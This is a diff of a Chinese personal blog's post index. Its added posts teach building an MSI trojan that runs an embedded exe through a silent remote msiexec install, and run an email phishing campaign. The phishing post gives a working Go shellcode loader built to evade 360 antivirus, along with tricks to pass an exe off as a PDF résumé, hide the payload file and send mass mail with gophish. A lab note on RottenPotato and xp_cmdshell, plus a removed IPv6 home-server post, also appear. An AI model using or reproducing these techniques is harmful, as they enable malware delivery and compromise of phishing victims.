+<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>alist</tag>
+        <tag>seafile</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msi木马创建</title>
+    <url>/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="MSI文件">MSI文件</h1>
+<p><code>MSI 文件</code>指的是 <code>Windows Installer Package </code>文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。</p>
+<p>Windows Installer 是 Microsoft Windows 操作系统中的一种安装技术，用于管理和执行软件的安装和卸载过程。MSI 文件是 Windows Installer 技术的核心组成部分，它以.msi 文件扩展名来标识。</p>
+<p>MSI 文件是一种数据库式文件，其中包含了安装程序所需的文件、注册表项、配置信息、脚本和其他相关组件。它提供了一种标准化的方式来描述和定义软件的安装过程，使得软件的安装和管理更加可靠和可预测。</p>
+<p>通过运行 MSI 文件，Windows Installer 将打开一个安装向导，引导用户完成软件的安装过程。安装过程中，Windows Installer 会根据 MSI 文件中的指令和设置，将文件复制到适当的位置，注册组件、创建快捷方式，执行系统配置等操作，最终将软件成功安装到目标计算机上。</p>
+<p>MSI 文件具有一些特性，如安装过程的事务性、修复和升级功能、卸载功能、自定义操作等。它们被广泛用于 Windows 系统中的软件安装，包括应用程序、驱动程序、插件和组件等。</p>
+<p>需要注意的是，运行 MSI 文件通常需要管理员权限或适当的安装权限，以确保安装过程能够成功地对系统进行更改和配置。</p>
+<p>常见的msi:</p>
+<p><img src="image-20230831230437851.png" alt="image-20230831230437851"></p>
+<h1 id="木马制作思路">木马制作思路</h1>
+<p>在MSI软件包中，<code>制作者可以使用自定义操作（Custom Actions）来执行特定的任务</code>，例如运行可执行文件、执行脚本、修改注册表等。当执行安装过程时，MSI软件包会按照事先定义的规则和流程执行这些自定义操作。如果将恶意的exe（也可以是dll、js和vbs）文件作为msi安装过程中要运行的文件，将直接触发恶意代码。</p>
+<p><code>msiexec</code>是Windows操作系统中的命令行实用程序，用于处理MSI（Microsoft Installer）文件。它是Microsoft Installer的执行引擎，负责解析和执行MSI文件中定义的安装、修复、更新和卸载操作。msiexec支持<code>远程加载</code>msi文件并安装。</p>
+<p>相当于通过msiexec间接运行我们的恶意exe，整个过程无文件落地。</p>
+<h1 id="创建msi文件">创建msi文件</h1>
+<p>msi文件可以通过<a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">Advanced Installer</a><a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">1</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">，Discover</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">2</a>，或者Visual Studio等方式创建，这里我们以Visual Studio 2022为例。</p>
+<h2 id="下载安装插件">下载安装插件</h2>
+<p>首先要下载安装<code>Visual Studio Installer Projects</code>插件，在vs中点击左上角<code>拓展</code>—&gt;<code>管理拓展</code>，直接搜索下载安装</p>
+<p><img src="image-20230831232418630.png" alt="image-20230831232418630"></p>
+<p>这样可能会比较慢，也可以直接下载<a href="https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects">拓展包</a>安装。</p>
+<h2 id="添加Setup-Project项目">添加Setup Project项目</h2>
+<p>创建一个新的<code>Setup Project</code>项目</p>
+<p><img src="image-20230831232701251.png" alt="image-20230831232701251"></p>
+<p>添加<code>项目输出</code></p>
+<p><img src="image-20230831232813669.png" alt="image-20230831232813669"></p>
+<p>选择<code>主输出</code></p>
+<p><img src="image-20230831232832022.png" alt="image-20230831232832022"></p>
+<blockquote>
+<p>可能会遇到项目输出是空的情况，应该是解决方案配置的问题，建议不要创建一个Setup Project项目的解决方案，而是在已有解决方案项目的情况下添加Setup Project项目</p>
+<p><img src="image-20230831234805675.png" alt="image-20230831234805675"></p>
+</blockquote>
+<h2 id="添加恶意exe">添加恶意exe</h2>
+<p>右键项目选择<code>自定义操作</code></p>
+<p><img src="image-20230831232942395.png" alt="image-20230831232942395"></p>
+<p>发现有四个操作分别为<code>&quot;安装&quot;、&quot;提交&quot;、&quot;回滚&quot;和&quot;卸载&quot;</code></p>
+<p><img src="image-20230831233023014.png" alt="image-20230831233023014"></p>
+<p>在安装程序中，“安装”、“提交”、&quot;回滚&quot;和&quot;卸载&quot;是四个常见的操作类型，它们用于描述不同的安装过程中的行为和阶段。</p>
+<ol>
+<li>安装（Install）：安装操作是指将应用程序或软件包安装到目标计算机上的过程。在安装操作中，文件、注册表项、服务、组件等将被复制、配置和注册到目标计算机的适当位置。通常，安装操作会创建所需的目录结构、注册必要的组件，并执行其他必要的配置任务。</li>
+<li>提交（Commit）：提交操作是指在安装过程中，当所有的文件和配置都已成功复制和注册到目标计算机时，确认将更改应用到系统的阶段。在提交操作之前，所有的安装操作都被视为临时性的。提交操作会将安装所做的更改永久性地应用到系统中，以确保应用程序的完整性和可用性。</li>
+<li>回滚（Rollback）：回滚操作是指当安装过程中发生错误或遇到问题时，将安装过程还原到初始状态的过程。如果在安装过程中出现错误，安装程序可以回滚（撤销）之前的所有操作，以恢复目标计算机到安装前的状态，以避免对系统造成不可逆的更改。</li>
+<li>卸载（Uninstall）：卸载操作是指从目标计算机中完全移除已安装的应用程序或软件包的过程。在卸载操作中，与安装过程相反，文件、注册表项、服务等与应用程序相关的组件将被删除，以及执行其他必要的清理任务。</li>
+</ol>
+<p>我们选择”安装“，右键添加自定义操作</p>
+<p>Add File可以添加具体的运行文件，这里以一个简单的弹框exe模拟恶意脚本</p>
+<p><img src="image-20230831233355250.png" alt="image-20230831233355250"></p>
+<p>点击OK则成功添加到”安装“操作中</p>
+<p><img src="image-20230831233542197.png" alt="image-20230831233542197"></p>
+<p>点击重新生成将生成两个文件，msi文件就是我们嵌入了恶意exe的目标文件</p>
+<p><img src="image-20230831233711946.png" alt="image-20230831233711946"></p>
+<h1 id="利用">利用</h1>
+<p>先用python起一个临时服务器，然后再目标主机上运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /i msi文件的url地址 /q TARGETDIR=&quot;C:/Users/Public/Documents&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>/i</code> 是 msiexec 命令的参数，表示执行安装操作。</li>
+<li><code>/q</code> 是 msiexec 命令的参数，表示以安静（静默）模式执行安装，即在不显示任何用户界面的情况下执行安装过程。</li>
+<li>TARGETDIR指定程序的安装位置，不指定的话则默认安装到Program Files下，则会有权限不够以及UAC的情况</li>
+</ul>
+<p>发现恶意exe被执行（messagebox.exe的功能就是弹出一个niupi）</p>
+<p><img src="image-20230831234223966.png" alt="image-20230831234223966"></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/syzcyyx/article/details/129482721">使用VisualStudio2022插件(Visual Studio Installer Projects 2022)打包 .Net 6 框架下的 WPF项目 为安装文件</a></p>
+<p><a href="https://blog.csdn.net/weixin_44790046/article/details/103016154">VS2019打包生成安装文件图文详细教程</a></p>
+<p><a href="https://blog.csdn.net/wmonica121/article/details/13503791">vs2010打包程序   项目输出组为空</a></p>
+<p><a href="https://www.c-sharpcorner.com/article/how-to-perform-custom-actions-and-upgrade-using-visual-studio-installer/">如何使用 Visual Studio 安装程序执行自定义操作和升级 (c-sharpcorner.com)</a></p>
+<p><a href="https://www.red-gate.com/simple-talk/development/dotnet-development/visual-studio-setup-projects-and-custom-actions/">Visual Studio 设置 - 项目和自定义操作 - 简单对话 (red-gate.com)</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
       </tags>
   </entry>
   <entry>
@@ -1094,77 +1170,6 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>准入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用ipv6搭建一台服务器</title>
-    <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p>
-<h3 id="硬件需求">硬件需求</h3>
-<p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
-<p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
-<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="准备工作">准备工作</h3>
-<p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
-<p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
-<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>下载balenaetcher将iso文件烧录至U盘中</p>
-<p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
-<p>可以以这个up主的视频作为参考</p>
-<p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br>
-<a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
-<h3 id="安装系统">安装系统</h3>
-<p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
-<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
-<p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
-<p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
-<h3 id="配置网络">配置网络</h3>
-<p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p>
-<p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p>
-<p>使用以下命令对网卡配置进行修改</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p>
-<p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
-<h3 id="获取域名">获取域名</h3>
-<p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
-<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
-<p>主机记录填写<strong>子域名名称</strong></p>
-<p>记录值填<strong>对应的ipv6地址</strong></p>
-<p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p>
-<p><strong>DDNS</strong></p>
-<p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p>
-<p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p>
-<p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p>
-<p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p>
-<p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p>
-<p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>添加定时任务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>这样ipv6地址就和域名绑定起来了</p>
-<p>到此为止基本的搭建任务就结束了</p>
-<h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3>
-<p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p>
-<p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p>
-<p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p>
-<p>3.取消root登录</p>
-<p>4.使用knockd来隐藏端口（终极隐藏大法）</p>
-<p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
-<p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p>
-<p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>
-]]></content>
-      <categories>
-        <category>经历</category>
-      </categories>
-      <tags>
-        <tag>ipv6</tag>
-        <tag>服务器</tag>
       </tags>
   </entry>
   <entry>
@@ -1393,6 +1398,142 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>邮箱钓鱼学习</title>
+    <url>/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p><code>邮箱钓鱼</code>是一种常见的网络攻击手段,它利用伪造的电子邮件来诱导目标用户点击恶意链接或附件,从而窃取敏感信息或执行恶意代码。在进行网络攻击的时候非常常见,毕竟资产最薄弱的部分依旧还是人。</p>
+<h1 id="制作免杀马">制作免杀马</h1>
+<p>邮箱钓鱼攻击的成功与否很大程度上取决于攻击者能否绕过目标系统的防御措施,如杀毒软件、防火墙、沙箱等。因此,学习如何制作免杀的恶意代码是提高邮箱钓鱼攻击效果的关键。</p>
+<p>目前网上有非常多能够帮助shellcode免杀的工具,也可以自己尝试写一写,这里以绕过360为目标</p>
+<p>参考<a href="https://www.freebuf.com/articles/endpoint/323789.html">云山雾隐的shellcode免杀入门文章</a>我们可以得到一个基础的免杀马</p>
+<p>大致原理是对shellcode进行<code>异或加密</code>再<code>base64编码</code>得到密文,然后再对密文进行解码同时加载到内存中,但这种方式同样容易被查杀（2023.6.2测试被杀）,所以我们可以分开写,弄两个文件,一个文件（文件名为.DS_Store）存放我们所加密的shellcode,另外一个可执行文件负责读取shellcode并加载到内存中</p>
+<p>shell.go代码如下：</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>,<span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">content, err := ioutil.ReadFile(<span class="string">&quot;.DS_Store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="type">string</span>(content)</span><br><span class="line"></span><br><span class="line">charcode := DD(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DD</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译生成可执行文件shell.exe</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go build -ldflags=&quot;-s -w -H=windowsgui&quot; shell.go</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230604163030198.png" alt="image-20230604163030198"></p>
+<p>双击后可发现木马成功上线（2023.6.4测试）</p>
+<p><img src="image-20230604163823173.png" alt="image-20230604163823173"></p>
+<h1 id="伪装">伪装</h1>
+<p>要想让鱼上钩就必须做好伪装,发送一个shell.exe只有傻子才会点,所以我们一般将文件伪装成一个pdf文档发送</p>
+<p>给受害者</p>
+<h2 id="pdf图标-命名">pdf图标+命名</h2>
+<p>使用<code>iconsext.exe</code>提取一个电脑上自带的pdf图标,我这里选择edge的pdf图标,得到对应的ico文件</p>
+<p>再利用<code>ico替换.exe</code>将shell.exe的图标替换</p>
+<p><img src="image-20230604170107321.png" alt="image-20230604170107321"></p>
+<p>接下来改个后缀,这里不能直接使用pdf.exe,也不能使用空格填充,因为360发现这种文件会直接查杀,所以我们可以找个特殊字符来替换pdf,并且让文件名字尽可能的长,尽量让受害者注意不到最后的exe,这里使用希腊字母的Ρ来代替,名字改为<code>xxxx大学_xxxx学院_xxxx专业_xxxxx个人简历.ΡDF.exe</code></p>
+<h2 id="文档报错">文档报错</h2>
+<p>可以利用GoFileBinder将shell.exe和一个正常的pdf文档绑定起来,打开exe后是一个正常的pdf文件,同时机器也会在后台悄悄上线,但如果我们钓鱼的目标不一样,那么对应打卡的pdf文档也要不一样,有的是一份简历,有的是一份通告……所以最方便的方法就是让受害者打开pdf后直接弹窗报错</p>
+<p>这里使用MessageBoxW这个api,代码如下</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">MessageBoxPlain(<span class="string">&quot;提示&quot;</span>, <span class="string">&quot;文件已损坏,无法打开&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBoxPlain</span><span class="params">(title, caption <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">        NULL = <span class="number">0</span></span><br><span class="line">        MB_OK = <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> MessageBox(NULL, caption, title, MB_OK)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBox</span><span class="params">(hwnd <span class="type">uintptr</span>, caption, title <span class="type">string</span>, flags <span class="type">uint</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    ret, _, _ := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>).NewProc(<span class="string">&quot;MessageBoxW&quot;</span>).Call(</span><br><span class="line">        <span class="type">uintptr</span>(hwnd),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),</span><br><span class="line">        <span class="type">uintptr</span>(flags))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>(ret)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="image-20230604164839058.png" alt="image-20230604164839058"></p>
+<p>将上述代码写入到shell.go中即可实现弹窗（位置要在syscall.Syscall(addr, 0, 0, 0, 0)上方,要先弹窗再执行shellcode）</p>
+<h2 id="隐藏文件">隐藏文件</h2>
+<p>.DS_Store（Desktop Services Store）文件是苹果公司操作系统 macOS 下用于存储目录的自定义属性和元数据的隐藏文件。这些属性和元数据包括文件夹的位置、图标、背景和视图选项等信息,可以帮助操作系统快速访问和渲染文件夹。在 macOS 的 Finder 中,每个文件夹都有一个与之对应的 .DS_Store 文件,它会随着文件夹的创建、打开、关闭和移动等操作而被创建或更新。</p>
+<p>这里将shellcode代码文件命名为.DS_Store就是为了减少受害者使用解压软件浏览压缩包时的疑心</p>
+<p>可以将.DS_Store文件设为隐藏文件来达到解压完后文件消失的效果,但是如果受害者开启了“查看隐藏项目”,那将会暴露该文件,可以使用以下命令将文件进行进一步的隐藏</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">attrib +S +H .DS_Store</span><br></pre></td></tr></table></figure>
+<p>这下就算开了“查看隐藏项目”也无法看到隐藏的文件</p>
+<p><img src="image-20230604173322404.png" alt="image-20230604173322404"></p>
+<p>这时候就可以打个压缩包发给受害者了（windows自带的压缩功能无法压缩的话使用WinRAR等第三方工具）</p>
+<p>效果：</p>
+<p><img src="image-20230604173628947.png" alt="image-20230604173628947"></p>
+<p><img src="image-20230604173846465.png" alt="image-20230604173846465"></p>
+<h1 id="钓鱼平台">钓鱼平台</h1>
+<p>这里使用gophish搭建钓鱼平台,详细的搭建指南可以查看<a href="http://blog.leanote.com/post/snowming/a6b66097bccd">这篇文章</a></p>
+<p>利用gophish我们可以自定义发件人和批量发送邮件到目标邮箱</p>
+<p>效果截图</p>
+<p><img src="image-20230604214339030.png" alt="image-20230604214339030"></p>
+<p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/11885#toc-4">记一个常规的免杀钓鱼流程</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+        <tag>社工</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>暗月ack靶场学习记录</title>
+    <url>/post/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录</p>
+<h1 id="烂土豆（RottenPotato）">烂土豆（RottenPotato）</h1>
+<p><code>烂土豆（Rotten Potato） MS16-075</code> 是一种利用 Windows 客户端操作系统中 NT AUTHORITY\SYSTEM 权限漏洞的攻击方法,可以实现本地提权,对应的补丁号为<code>KB3164038</code></p>
+<p>适用版本：<code>Windows 7、8、10、2008、2012</code></p>
+<p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码</p>
+<p>若要利用此漏洞,攻击者首先必须登录系统。然后,攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序,从而控制受影响的系统,可见,该漏洞的利用方式还是比较简单的</p>
+<p>首先在拥有一个登录用户的情况下输入<code>whoami /prive</code>查看当前用户的权限</p>
+<p>如果发现有<code>SeAssignPrimaryTokenPrivilege</code>权限或者<code>SeImpersonatePrivilege</code> 权限并且系统未打对应的补丁则可以成功利用烂土豆提权</p>
+<h1 id="MSSQL拿shell">MSSQL拿shell</h1>
+<p>拿到sql server的<code>sa账户</code>以后可以通过<code>xp_cmdshell</code>来执行系统命令</p>
+<p>先判断xp_shell是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+<p>如果显示0则可以通过以下命令重新加载</p>
